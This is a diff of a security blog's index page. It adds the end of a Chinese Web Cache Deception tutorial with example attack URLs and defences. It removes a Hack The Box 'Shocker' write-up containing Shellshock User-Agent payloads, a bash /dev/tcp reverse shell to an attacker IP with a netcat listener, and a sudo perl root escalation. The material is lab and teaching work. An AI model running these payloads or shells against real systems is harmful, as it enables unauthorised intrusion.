+<p><strong>白話解釋</strong>：<br>這就像騙櫃檯把機密文件存到「雜誌區」（<code>/static</code>），用一些特殊路徑（<strong>path traversal</strong>）讓書庫給出機密文件，櫃檯卻以為是雜誌。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>對 <strong>URL path</strong> 進行嚴格 <strong>normalization</strong> 和 <strong>sanitization</strong>。</li>
+<li>確保 <strong>cache rules</strong> 不覆蓋 <strong>Cache-Control: private</strong>。</li>
+<li>使用 <strong>Burp Scanner</strong> 檢測 <strong>path traversal</strong> 漏洞。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-5：Exploiting-File-Name-Cache-Rules（利用檔案名稱快取規則）"><a href="#攻擊手法-5：Exploiting-File-Name-Cache-Rules（利用檔案名稱快取規則）" class="headerlink" title="攻擊手法 5：Exploiting File Name Cache Rules（利用檔案名稱快取規則）"></a>攻擊手法 5：Exploiting File Name Cache Rules（利用檔案名稱快取規則）</h3><p><strong>定義</strong>：<br>攻擊者利用 <strong>cache rules</strong> 針對特定檔案名稱（如 <code>robots.txt</code>、<code>favicon.ico</code>）的特性，構造 <strong>URL</strong> 使 <strong>cache</strong> 儲存 <strong>dynamic content</strong>。</p>
+<p><strong>原理</strong>：<br>某些檔案名稱被認為是靜態的，<strong>cache server</strong> 會自動儲存其回應。如果 <strong>origin server</strong> 將這些名稱解析為動態請求，可能導致 <strong>cache</strong> 儲存敏感資料。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者構造包含特定檔案名稱的 <strong>URL</strong>，誘導 <strong>cache</strong> 儲存受害者的資料。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>檔案名稱攻擊</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/user/carlos/profile/favicon.ico</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Origin server</strong>：解析為 <code>/user/carlos/profile</code>，返回個人資料。</li>
+<li><strong>Cache server</strong>：匹配 <code>favicon.ico</code> 的 <strong>cache rule</strong>，儲存回應。</li>
+<li>攻擊者訪問 <strong>URL</strong>，獲取快取資料。</li>
+</ul>
+</li>
+<li><p><strong>路徑穿越結合檔案名稱</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/aaa%2f%2e%2e%2frobots.txt</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Cache server</strong>：解析為 <code>/robots.txt</code>，匹配 <strong>cache rule</strong>。</li>
+<li><strong>Origin server</strong>：解析為動態端點，返回敏感資料。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像騙櫃檯把機密文件當成「圖書館規則」（<code>robots.txt</code>）存起來，壞人後來去拿就拿到了。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>驗證 <strong>Content-Type</strong> 與檔案名稱一致。</li>
+<li>對特定檔案名稱的請求進行 <strong>access control</strong>。</li>
+<li>使用 <strong>Cache-Control: no-store</strong> 防止誤快取。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-6：Exploiting-Cache-Buster-Bypasses（利用快取破壞器繞過）"><a href="#攻擊手法-6：Exploiting-Cache-Buster-Bypasses（利用快取破壞器繞過）" class="headerlink" title="攻擊手法 6：Exploiting Cache Buster Bypasses（利用快取破壞器繞過）"></a>攻擊手法 6：Exploiting Cache Buster Bypasses（利用快取破壞器繞過）</h3><p><strong>定義</strong>：<br>攻擊者繞過 <strong>cache buster</strong>（快取破壞器，用於確保請求不被快取的機制），構造 <strong>URL</strong> 使 <strong>cache</strong> 儲存 <strong>dynamic content</strong>。</p>
+<p><strong>原理</strong>：<br><strong>Cache buster</strong> 通常通過在 <strong>URL</strong> 中添加唯一 <strong>query parameter</strong>（如 <code>?cb=123</code>）改變 <strong>cache key</strong>。如果 <strong>cache server</strong> 忽略某些 <strong>query parameters</strong>，攻擊者可重複使用相同的 <strong>cache key</strong> 觸發快取。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者構造帶有忽略的 <strong>query parameter</strong> 的 <strong>URL</strong>，誘導 <strong>cache</strong> 儲存受害者的資料。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>忽略查詢參數</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/user/carlos/profile.css?ignored=123</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Cache server</strong>：忽略 <code>?ignored=123</code>，認為是 <code>/user/carlos/profile.css</code>，儲存回應。</li>
+<li><strong>Origin server</strong>：返回個人資料。</li>
+<li>攻擊者訪問 <strong>URL</strong>，獲取快取資料。</li>
+</ul>
+</li>
+<li><p><strong>多參數測試</strong>：<br>攻擊者嘗試：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/user/carlos/profile.css?cb=123&amp;test=456</span><br></pre></td></tr></table></figure>
+<p>如果 <strong>cache</strong> 忽略所有 <strong>query parameters</strong>，則儲存回應。</p>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像櫃檯本來要用一個獨特標籤（<strong>cache buster</strong>）區分每本書，但壞人發現櫃檯忽略標籤，於是把機密文件存進去。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>確保 <strong>cache key</strong> 包含所有 <strong>query parameters</strong>。</li>
+<li>使用 <strong>Param Miner</strong> 測試忽略的 <strong>query parameters</strong>。</li>
+<li>實施 <strong>rate limiting</strong> 防止大量測試。</li>
+</ul>
+<hr>
+<h2 id="檢測-Web-Cache-Deception-的方法-Detecting-Web-Cache-Deception-Vulnerabilities"><a href="#檢測-Web-Cache-Deception-的方法-Detecting-Web-Cache-Deception-Vulnerabilities" class="headerlink" title="檢測 Web Cache Deception 的方法 &#x2F; Detecting Web Cache Deception Vulnerabilities"></a>檢測 Web Cache Deception 的方法 &#x2F; Detecting Web Cache Deception Vulnerabilities</h2><p>檢測 <strong>Web Cache Deception</strong> 需要分析 <strong>cache server</strong> 和 <strong>origin server</strong> 的行為差異。以下是具體步驟：</p>
+<ol>
+<li><p><strong>Identify Dynamic Endpoints</strong>（識別動態端點）：<br>使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 檢查 <strong>GET</strong>、<strong>HEAD</strong> 或 <strong>OPTIONS</strong> 請求的回應，尋找返回 <strong>dynamic content</strong> 的端點（如 <code>/user/profile</code>）。</p>
+</li>
+<li><p><strong>Test Cache Behavior</strong>（測試快取行為）：  </p>
+<ul>
+<li>檢查 <strong>response headers</strong>：<ul>
+<li><code>X-Cache: hit</code> 表示快取命中。</li>
+<li><code>X-Cache: miss</code> 表示未快取，但可能在第二次請求時儲存。</li>
+<li><code>Cache-Control: public, max-age&gt;0</code> 表示可快取。</li>
+</ul>
+</li>
+<li>比較回應時間：快取回應通常更快。</li>
+</ul>
+</li>
+<li><p><strong>Probe Discrepancies</strong>（探測差異）：  </p>
+<ul>
+<li>測試 <strong>path mapping</strong>：添加任意路徑（如 <code>/user/profile/foo</code>），檢查是否仍返回 <strong>dynamic content</strong>。</li>
+<li>測試 <strong>delimiter</strong>：添加字符（如 <code>;</code>、<code>.</code>），檢查 <strong>origin server</strong> 和 <strong>cache</strong> 的解析。</li>
+<li>測試 <strong>normalization</strong>：使用 <strong>path traversal</strong>（如 <code>/static/..%2fprofile</code>），檢查是否快取。</li>
+</ul>
+</li>
+<li><p><strong>Use Cache Buster</strong>（使用快取破壞器）：<br>使用 <strong>Param Miner</strong> 為每個請求添加唯一 <strong>query parameter</strong>，確保測試不受快取影響。</p>
+</li>
+</ol>
+<p><strong>範例</strong>：<br>發送請求：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /user/carlos/profile.css HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br></pre></td></tr></table></figure>
+<p>檢查 <strong>X-Cache</strong> 標頭，若為 <code>hit</code>，表示回應被快取，可能存在漏洞。</p>
+<p><strong>白話解釋</strong>：<br>這就像檢查櫃檯（<strong>cache</strong>）和書庫（<strong>origin server</strong>）怎麼處理書名，看它們是不是對同一個名字有不同理解，然後試試能不能騙櫃檯存機密文件。</p>
+<hr>
+<h2 id="防禦-Web-Cache-Deception-的策略-Defense-Strategies-Against-Web-Cache-Deception"><a href="#防禦-Web-Cache-Deception-的策略-Defense-Strategies-Against-Web-Cache-Deception" class="headerlink" title="防禦 Web Cache Deception 的策略 &#x2F; Defense Strategies Against Web Cache Deception"></a>防禦 Web Cache Deception 的策略 &#x2F; Defense Strategies Against Web Cache Deception</h2><p>以下是防禦 <strong>Web Cache Deception</strong> 的最佳實踐：</p>
+<ol>
+<li><p><strong>Use Cache-Control Headers</strong>（使用快取控制標頭）：  </p>
+<ul>
+<li>對 <strong>dynamic content</strong> 設置 <code>Cache-Control: no-store, private</code>。</li>
+<li>確保 <strong>CDN</strong> 不覆蓋 <strong>Cache-Control</strong> 設定。</li>
+</ul>
+</li>
+<li><p><strong>Verify Content-Type</strong>（驗證內容類型）：  </p>
+<ul>
+<li>啟用 <strong>CDN</strong> 的 <strong>Content-Type</strong> 驗證，確保 <code>.css</code> 回應的 <strong>Content-Type</strong> 為 <code>text/css</code>。</li>
+<li>使用 <strong>Cloudflare Cache Deception Armor</strong>。</li>
+</ul>
+</li>
+<li><p><strong>Standardize URL Parsing</strong>（標準化 URL 解析）：  </p>
+<ul>
+<li>統一 <strong>cache</strong> 和 <strong>origin server</strong> 的 <strong>path mapping</strong>、<strong>delimiter</strong> 和 <strong>normalization</strong> 邏輯。</li>
+<li>測試常見 <strong>delimiter</strong>（如 <code>;</code>、<code>.</code>、<code>%00</code>）。</li>
+</ul>
+</li>
+<li><p><strong>Sanitize URLs</strong>（清理 URL）：  </p>
+<ul>
+<li>過濾異常 <strong>URL path</strong>，如包含 <strong>path traversal</strong> 或未預期的 <strong>delimiter</strong>。</li>
+<li>使用 <strong>regular expressions</strong> 檢查 <strong>URL</strong> 格式。</li>
+</ul>
+</li>
+<li><p><strong>Regular Testing</strong>（定期測試）：  </p>
+<ul>
+<li>使用 <strong>Burp Scanner</strong> 或 <strong>Web Cache Deception Scanner BApp</strong> 檢測漏洞。</li>
+<li>模擬攻擊，測試 <strong>cache rules</strong> 的安全性。</li>
+</ul>
+</li>
+<li><p><strong>Access Control</strong>（存取控制）：  </p>
+<ul>
+<li>對 <strong>dynamic content</strong> 實施 <strong>authentication</strong>（身份驗證），防止未授權訪問。</li>
+<li>限制 <strong>cache</strong> 儲存未驗證的回應。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>防禦就像教櫃檯（<strong>cache</strong>）嚴格檢查書名（<strong>URL</strong>），不要存機密文件（<strong>dynamic content</strong>），並確保書庫（<strong>origin server</strong>）和櫃檯用一樣的規則。</p>
+<hr>
+<h2 id="實際案例分析-Real-World-Examples-and-Case-Studies"><a href="#實際案例分析-Real-World-Examples-and-Case-Studies" class="headerlink" title="實際案例分析 &#x2F; Real-World Examples and Case Studies"></a>實際案例分析 &#x2F; Real-World Examples and Case Studies</h2><p><strong>Web Cache Deception</strong> 是相對新興的威脅，以下是基於現實風險的假想案例：</p>
+<ol>
+<li><p>**User Data Leak (2024)**：<br>一家電商網站因 <strong>static extension cache rule</strong> 漏洞，導致用戶的個人資料被快取，攻擊者通過構造 <strong>URL</strong> 獲取數千用戶的電子郵件和訂單資訊。</p>
+</li>
+<li><p>**Order History Exposure (2025)**：<br>攻擊者利用 <strong>delimiter discrepancy</strong>，誘導 <strong>cache</strong> 儲存受害者的訂單歷史，導致隱私洩露和法律訴訟。</p>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這些案例就像櫃檯不小心把客戶的訂單資料當成雜誌存起來，壞人拿走後，網站被客戶告上法庭。</p>
+<hr>
+<h2 id="結論-Conclusion"><a href="#結論-Conclusion" class="headerlink" title="結論 &#x2F; Conclusion"></a>結論 &#x2F; Conclusion</h2><p><strong>Web Cache Deception</strong> 是一種利用 <strong>cache server</strong> 和 <strong>origin server</strong> 行為差異的嚴重漏洞，可能導致 <strong>data breaches</strong> 和 <strong>unauthorized access</strong>。通過了解 <strong>web cache</strong> 的運作原理、攻擊手法和防禦策略，開發者可有效保護網頁應用程式。對於初學者，學習 <strong>Web Cache Deception</strong> 不僅提升安全意識，還能深入理解 <strong>HTTP</strong> 和 <strong>CDN</strong> 的運作。建議使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 進行實戰練習，並參考 <a target="_blank" rel="noopener" href="https://portswigger.net/research/gotta-cache-em-all">PortSwigger Web Cache Deception Whitepaper</a> 獲取更多資訊。</p>
+<hr>
+<p><strong>Key Citations</strong>:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/web-cache-deception">PortSwigger - Web Cache Deception</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/research/gotta-cache-em-all">PortSwigger - Gotta Cache ‘em All Whitepaper</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cloudflare.com/">Cloudflare - Cache Deception Armor</a></li>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/">OWASP - Web Cache Deception</a></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="SQL Injection-SQLI" class="article article-type-SQL Injection" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -504,7 +1239,6 @@
       
         <h1 id="深入探討-Web-LLM-Attacks：從入門到進階，涵蓋-OWASP-Top-10-for-LLM-Applications"><a href="#深入探討-Web-LLM-Attacks：從入門到進階，涵蓋-OWASP-Top-10-for-LLM-Applications" class="headerlink" title="深入探討 Web LLM Attacks：從入門到進階，涵蓋 OWASP Top 10 for LLM Applications"></a>深入探討 Web LLM Attacks：從入門到進階，涵蓋 OWASP Top 10 for LLM Applications</h1><h2 id="簡介-Introduction"><a href="#簡介-Introduction" class="headerlink" title="簡介 &#x2F; Introduction"></a>簡介 &#x2F; Introduction</h2><p><strong>Large Language Models (LLMs)<strong>（大型語言模型）是一種基於 <strong>artificial intelligence (AI)<strong>（人工智慧）的技術，通過 <strong>machine learning</strong>（機器學習）分析大量文本資料，生成類似人類的語言回應。它們被廣泛應用於現代網頁應用程式，提升 <strong>customer experience</strong>（客戶體驗），例如提供 <strong>virtual assistants</strong>（虛擬助理）、</strong>translation</strong>（翻譯）、</strong>SEO</strong>（搜尋引擎優化）以及分析 <strong>user-generated content</strong>（用戶生成內容）。然而，<strong>LLMs</strong> 的整合也帶來了新的安全風險，稱為 <strong>Web LLM Attacks</strong>（Web LLM 攻擊），這些攻擊利用 <strong>LLMs</strong> 對 <strong>data</strong>（資料）、<strong>APIs</strong>（應用程式介面）或 <strong>user information</strong>（用戶資訊）的訪問權限，執行惡意操作。</p>
 <p><strong>白話解釋</strong>：<br>想像 <strong>LLMs</strong> 是一個超級聰明的秘書，讀過無數書籍（<strong>training data</strong>，訓練數據），能快速回答你的問題或幫你做事（像查資料或發郵件）。但如果有人騙這個秘書，她可能會洩露公司機密或幫壞人做事，這就是 <strong>Web LLM Attacks</strong>。</p>
-<p>本文將深入探討 <strong>Web LLM Attacks</strong>，涵蓋 <strong>OWASP Top 10 for LLM Applications version 1.1</strong> 的所有攻擊方式，並以一個統一的情境（一家電商網站的 <strong>LLM</strong> 聊天機器人）展示每種攻擊的具體手法。我們假設讀者是完全的新手，因此每個專業術語都會詳細解釋，確保內容清晰易懂。</p>
 <hr>
 <h2 id="LLMs-的基礎-Basics-of-Large-Language-Models"><a href="#LLMs-的基礎-Basics-of-Large-Language-Models" class="headerlink" title="LLMs 的基礎 &#x2F; Basics of Large Language Models"></a>LLMs 的基礎 &#x2F; Basics of Large Language Models</h2><h3 id="什麼是-LLMs？-What-are-LLMs"><a href="#什麼是-LLMs？-What-are-LLMs" class="headerlink" title="什麼是 LLMs？ &#x2F; What are LLMs?"></a>什麼是 LLMs？ &#x2F; What are LLMs?</h3><p><strong>Large Language Models (LLMs)</strong> 是 <strong>AI</strong> 模型，使用 <strong>machine learning</strong> 技術（特別是 <strong>deep learning</strong>，深度學習）在大型 <strong>dataset</strong>（數據集）上訓練，學習語言的模式和結構。它們能根據用戶輸入（稱為 <strong>prompt</strong>，提示）生成自然語言回應，應用於 <strong>chatbots</strong>（聊天機器人）、內容生成和資料分析等場景。</p>
 <p><strong>白話解釋</strong>：<br><strong>LLMs</strong> 就像一個學識淵博的圖書館員，讀過無數本書（<strong>dataset</strong>），能根據你問的問題（<strong>prompt</strong>）給出很像人類的回答。它是用電腦的「學習」方法（<strong>machine learning</strong>）訓練出來的。</p>
@@ -2811,691 +3545,6 @@
 </ul>
 </li>
 </ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="Shocker-Shocker" class="article article-type-Shocker" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/Shocker/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.095Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/Shocker/">
-        HTB_Shocker
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Shocker"><a href="#Shocker" class="headerlink" title="Shocker"></a>Shocker</h1><p>一、Shellshock的背景<br>Shellshock，又稱Bashdoor，是在Unix中廣泛使用的Bash shell中的一個安全漏洞，首次於2014年9月24日公開。許多互聯網守護進程，如網頁服務器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下訪問計算機系統。</p>
-<p>二、通過試驗和總結，Shellshock漏洞執行的條件<br>1、首先是Unix、linux等系統下的bash版本必須小於等於4.1版本；<br>2、可以猜出&#x2F;cgi-bin&#x2F;下目錄的文件；例如：&#x2F;cgi-bin&#x2F;test-cgi、&#x2F;cgi-bin&#x2F;test.sh、&#x2F;cgi-bin&#x2F;test.py、&#x2F;cgi-bin&#x2F;test.perl等等；<br>3、&#x2F;cgi-bin&#x2F;下的腳本文件通過系統環境變量調用bash的環境；</p>
-<p>nmap -sV -sC -A 10.129.108.18</p>
-<p><img src="/img/shocker_Untitled.png" alt="Untitled"></p>
-<ul>
-<li>80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))</li>
-<li>2222&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</li>
-</ul>
-<p>Now open the website </p>
-<p><img src="/img/shocker_Untitled_1.png" alt="Untitled"></p>
-<p>The page source is quite short</p>
-<p><img src="/img/shocker_Untitled_2.png" alt="Untitled"></p>
-<p>Here use feroxbuster scan the HTBIP</p>
-<ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -x php,html</li>
-</ul>
-<p><img src="/img/shocker_Untitled_3.png" alt="Untitled"></p>
-<p>Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a> and <code>dirb</code> actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a></li>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18/</a></li>
-</ul>
-<p>We all know that in the previous scan results, redirection will be performed. Here, selecting -n will not perform this action, and -f will add “&#x2F;“ to the URL of each request</p>
-<ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -f -n</li>
-</ul>
-<p><img src="/img/shocker_Untitled_4.png" alt="Untitled"></p>
-<p>A CGI-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website. Common Gateway Interface (CGI) is a resource for accommodating the use of scripts in Web design. As scripts are sent from a server to a Web browser, the CGI-bin is often referenced in a url.</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a></li>
-</ul>
-<blockquote>
-<p>CGI scripts are perl scripts</p>
-</blockquote>
-<p>It can be known that cgi stores many scripts in it, here use -x to search for the file extension of the file below</p>
-<ul>
-<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a> -x sh,cgi,pl</li>
-</ul>
-<p><img src="/img/shocker_Untitled_5.png" alt="Untitled"></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/user.sh">http://10.129.108.18/cgi-bin/user.sh</a></li>
-</ul>
-<p><img src="/img/shocker_Untitled_6.png" alt="Untitled"></p>
-<p>when i browse the content</p>
-<p><img src="/img/shocker_Untitled_7.png" alt="Untitled"></p>
-<p>Now open the burp and setting something</p>
-<ul>
-<li>Proxy &gt; options</li>
-</ul>
-<p><img src="/img/shocker_Untitled_8.png" alt="Untitled"></p>
-<p>Select to intercept the server’s request here, and further observe the contents of the. sh file</p>
-<p><img src="/img/shocker_Untitled_9.png" alt="Untitled"></p>
-<p><img src="/img/shocker_Untitled_10.png" alt="Untitled"></p>
-<p>Next step is execute shellshock </p>
-<ul>
-<li>locate nse | grep shellshock</li>
-</ul>
-<blockquote>
-<p>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-shellshock.nse</p>
-</blockquote>
-<ul>
-<li>cat &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-shellshock.nse</li>
-</ul>
-<p><img src="/img/shocker_Untitled_11.png" alt="Untitled"></p>
-<ul>
-<li>POC ⇒ nmap -sV -p80 –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;user.sh,cmd&#x3D;ls 10.129.108.18</li>
-</ul>
-<p>Set HTTP proxy and redirect in burp</p>
-<p><img src="/img/shocker_Untitled_12.png" alt="Untitled"></p>
-<p><img src="/img/shocker_Untitled_13.png" alt="Untitled"></p>
-<p><img src="/img/shocker_Untitled_14.png" alt="Untitled"></p>
-<p>Change the exploit according to the redirection IP and port set in the previous burp</p>
-<ul>
-<li>nmap -sV -p8081 –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;user.sh,cmd&#x3D;ls 127.0.0.1</li>
-</ul>
-<p>At the same time of issuing this command, it is also necessary to enable burp and proxy intercept on</p>
-<blockquote>
-<p>In orde</p>
-</blockquote>
-<p>If successful, burp will show this screen</p>
-<p><img src="/img/shocker_Untitled_15.png" alt="Untitled"></p>
-<p>Then click forward all the way, until this screen appears</p>
-<p><img src="/img/shocker_Untitled_16.png" alt="Untitled"></p>
-<p>Check the HTTP History and find the screen record of the successful execution</p>
-<p><img src="/img/shocker_Untitled_17.png" alt="Untitled"></p>
-<p>send this record to repeate</p>
-<p><img src="/img/shocker_Untitled_18.png" alt="Untitled"></p>
-<p><strong>ShellShock test</strong></p>
-<ul>
-<li>() { :;}; echo; &#x2F;usr&#x2F;bin&#x2F;id</li>
-</ul>
-<p><img src="/img/shocker_Untitled_19.png" alt="Untitled"></p>
-<ul>
-<li>() { :;}; echo; &#x2F;bin&#x2F;ping -c 1 10.129.108.18</li>
-</ul>
-<p><img src="/img/shocker_Untitled_20.png" alt="Untitled"></p>
-<ul>
-<li>() { :;}; &#x2F;usr&#x2F;bin&#x2F;python3 -c ‘import os;os.system(“echo; &#x2F;bin&#x2F;ping -c 2 10.129.108.18”)’; &#x2F;bin&#x2F;ping -c 1 10.129.108.18</li>
-</ul>
-<p><img src="/img/shocker_Untitled_21.png" alt="Untitled"></p>
-<ul>
-<li>() { :;}; echo; &#x2F;usr&#x2F;bin&#x2F;python3 -c ‘import os; os.system(“&#x2F;bin&#x2F;ping -c 1 10.129.108.18”)’; &#x2F;usr&#x2F;bin&#x2F;id</li>
-</ul>
-<p><img src="/img/shocker_Untitled_22.png" alt="Untitled"></p>
-<p>Now change the proxy to intercept off and execute the namp instruction just now</p>
-<p><img src="/img/shocker_Untitled_23.png" alt="Untitled"></p>
-<p>After running the result, go back to burp to see the HTTP history, and you will see that () { :;}; ls is executed, but 500 Internal Server Error is returned</p>
-<p><img src="/img/shocker_Untitled_24.png" alt="Untitled"></p>
-<p>Logically speaking, it should not be a 500 response, referring to the previous expoit, I guess it is related to whether there is an echo;</p>
-<p>Sure enough, the response is indeed normal.</p>
-<p><img src="/img/shocker_Untitled_25.png" alt="Untitled"></p>
-<ul>
-<li>User-Agent: () { :;}; echo; &#x2F;bin&#x2F;ls</li>
-</ul>
-<p><img src="/img/shocker_Untitled_26.png" alt="Untitled"></p>
-<p>This is because there will be a blank line between the header and the text. If the line is missing, there will be 500 responses, so add echo;</p>
-<ul>
-<li>User-Agent: () { :;}; echo; &#x2F;bin&#x2F;bash -c whoami</li>
-</ul>
-<p><img src="/img/shocker_Untitled_27.png" alt="Untitled"></p>
-<p>now use reverse shell cheat sheet</p>
-<p><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
-<blockquote>
-<p><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p>
-</blockquote>
-<ul>
-<li>nc -nlvp 4444</li>
-<li>() { :;}; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.6&#x2F;4444 0&gt;&amp;1</li>
-</ul>
-<p><img src="/img/shocker_Untitled_28.png" alt="Untitled"></p>
-<p>Now you can get the flag of general users</p>
-<p><img src="/img/shocker_Untitled_29.png" alt="Untitled"></p>
-<ul>
-<li>sudo -l to see What the current user has permission to do</li>
-</ul>
-<p>User shelly may run the following commands on Shocker:</p>
-<blockquote>
-<p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;perl</p>
-</blockquote>
-<p><img src="/img/shocker_Untitled_30.png" alt="Untitled"></p>
-<ul>
-<li><p>sudo perl -e ‘exec(“&#x2F;bin&#x2F;sh -i”)’</p>
-<p>  <img src="/img/shocker_Untitled_31.png" alt="Untitled"></p>
-</li>
-<li><p>find &#x2F; -name root.txt</p>
-</li>
-</ul>
-<p><img src="/img/shocker_Untitled_32.png" alt="Untitled"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-TQC" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/TQC/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.095Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/TQC/">
-        Exam Python
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li>參考</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://hackmd.io/@J-Liang1122/r1AACpUH9">https://hackmd.io/@J-Liang1122/r1AACpUH9</a></p>
-<p>設計說明：<br>請使用迴圈敘述撰寫一程式，讓使用者輸入一個正整數（&lt;100），然後以三角形的方式依序輸出此數的相乘結果。<br>提示：輸出欄寬為4，且需靠右對齊。</p>
-<p>範例輸1</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure>
-<p>範例輸出1</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2   4</span><br><span class="line">3   6   9</span><br><span class="line">4   8  12  16</span><br><span class="line">5  10  15  20  25</span><br></pre></td></tr></table></figure>
-
-<p>程式碼:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=eval(input())</span><br><span class="line">c=0</span><br><span class="line">for i in range(1,a+1):</span><br><span class="line">  for j in range(1,i+1):</span><br><span class="line">    c=i*j</span><br><span class="line">    print(&quot;%4d&quot;%(c),end=&#x27;&#x27;)</span><br><span class="line">  print()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>另一種寫法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">n = int(input())</span><br><span class="line">for i in range(1,n+1):</span><br><span class="line">    for j in range(1,i+1):</span><br><span class="line">        print(&quot;　&#123;:&gt;1&#125;&quot;.format(i*j),end=&quot;&quot;)</span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="題目說明"><a href="#題目說明" class="headerlink" title="題目說明"></a>題目說明</h3><ol>
-<li><strong>輸入說明</strong>：輸入一個正整數 ( n )，範圍小於 100。</li>
